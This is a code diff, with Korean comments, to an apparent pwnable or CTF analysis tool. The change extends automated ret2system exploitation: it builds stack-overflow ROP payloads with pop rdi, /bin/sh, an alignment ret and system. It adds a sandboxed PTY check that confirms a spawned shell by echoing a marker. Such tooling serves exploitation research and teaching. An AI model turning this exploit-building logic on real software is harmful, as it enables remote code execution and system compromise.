@@ -5,6 +5,7 @@ from __future__ import annotations
 import hashlib
 import logging
 import os
+import secrets
 import stat
 import tempfile
 from dataclasses import asdict, dataclass
@@ -37,8 +38,9 @@ from pwnable_lab.analyzer.strings import extract_strings
 from pwnable_lab.analyzer.vuln_scan import scan_vulns
 from pwnable_lab.config import Settings
 from pwnable_lab.elf.parser import ElfImage, parse_elf
-from pwnable_lab.errors import AnalysisError
+from pwnable_lab.errors import AnalysisError, SandboxError
 from pwnable_lab.formats import ArtifactFormat, detect_format
+from pwnable_lab.payload.pack import RopStep, build_overflow
 from pwnable_lab.pe.analyzer import (
     disassemble_pe,
     disassemble_raw,
@@ -57,6 +59,7 @@ from pwnable_lab.sandbox import (
     require_sandbox_enabled,
     verify_exploit_in_container,
     verify_exploit_in_process,
+    verify_shell,
 )
 
 logger = logging.getLogger(__name__)
@@ -434,26 +437,77 @@ class AnalysisService:
             chains.append([binsh, ret, system])  # movaps 정렬 변형
 
         best: dict = {}
-        alignment = False
+        reached: tuple[dict, bool, dict | None] | None = None
         for i, chain in enumerate(chains):
             result = self.verify_exploit(
                 data, offset=offset, target=pop_rdi, chain=chain, bits=bits
             )
             best = result
-            if reached_system(result):
-                alignment = i > 0
+            if not reached_system(result):
+                continue
+            # 제어가 system 에 도달했으면, in-process 에서는 PTY 로 셸이 실제
+            # 명령을 실행하는지까지 증명한다(휴리스틱 → 증거로 승격). 정렬(movaps)
+            # 때문에 정렬 없는 체인은 do_system 에서 죽어 셸이 안 뜰 수 있으므로,
+            # 도달하는 각 체인마다 증명을 시도하고 증명되는 체인을 우선한다.
+            proof = self._prove_shell(data, offset, pop_rdi, chain, bits)
+            if proof and proof["shell_spawned"]:
                 return self._ret2system_report(
-                    plan, alignment, True, "control-into-system", result
+                    plan, i > 0, True, "shell-proven", result, proof
                 )
+            if reached is None:
+                reached = (result, i > 0, proof)
+        if reached is not None:
+            result, alignment, proof = reached
+            return self._ret2system_report(
+                plan, alignment, True, "control-into-system", result, proof
+            )
         return self._ret2system_report(
-            plan, alignment, False, "did-not-reach-system", best
+            plan, False, False, "did-not-reach-system", best, None
         )
+
+    def _prove_shell(
+        self, data: bytes, offset: int, target: int, chain: list[int], bits: int
+    ) -> dict | None:
+        """PTY 로 ret2system payload 가 실제 셸을 띄우고 명령을 실행하는지 증명.
+
+        대화형 tty 라인 규율이 파이프의 stdio 버퍼링 문제를 우회하므로, spawn 된
+        셸에 ``echo <marker>`` 를 흘려 marker 를 회수하면 셸 획득이 증명된다.
+        콜백/PTY 기반이라 무상태 컨테이너 CLI 로는 아직 노출돼 있지 않아
+        in-process executor 에서만 수행한다.
+        """
+
+        if self.settings.sandbox_executor != "inprocess" or bits != 64:
+            return None
+        marker = "PWNPILOT_" + secrets.token_hex(4)
+        payload = build_overflow(
+            offset, target, bits=bits, chain=[RopStep(a) for a in chain]
+        )
+        limits = SandboxLimits(
+            wall_seconds=self.settings.sandbox_wall_seconds,
+            cpu_seconds=self.settings.sandbox_cpu_seconds,
+            address_space_bytes=self.settings.sandbox_address_space_bytes,
+        )
+        path = self._materialize(data)
+        try:
+            return verify_shell(path, payload, marker=marker, limits=limits).as_dict()
+        except SandboxError:
+            return None
+        finally:
+            try:
+                os.unlink(path)
+            except OSError:
+                pass
 
     @staticmethod
     def _ret2system_report(
-        plan: dict, alignment: bool, succeeded: bool, reason: str, result: dict
+        plan: dict,
+        alignment: bool,
+        succeeded: bool,
+        reason: str,
+        result: dict,
+        shell_proof: dict | None,
     ) -> dict:
-        return {
+        report = {
             "attempted": True,
             "technique": "ret2system",
             "pop_rdi_hex": f"0x{plan['pop_rdi']:x}",
@@ -462,12 +516,16 @@ class AnalysisService:
             "alignment_ret_gadget": alignment,
             "succeeded": succeeded,
             "reason": reason,
+            "shell_proven": bool(shell_proof and shell_proof["shell_spawned"]),
             "note": (
-                "제어가 system() 으로 이전됨(rdi=/bin/sh). 완전한 셸 상호작용은 "
-                "대화형 세션이 필요하며 비대화형 샌드박스에서는 증명하지 않는다."
+                "제어가 system() 으로 이전됨(rdi=/bin/sh). shell_proven=true 면 "
+                "PTY 로 spawn 된 셸이 실제 명령(echo marker)을 실행함을 확인했다."
             ),
             "result": result,
         }
+        if shell_proof is not None:
+            report["shell_proof"] = shell_proof
+        return report
 
     def verify_exploit(
         self,
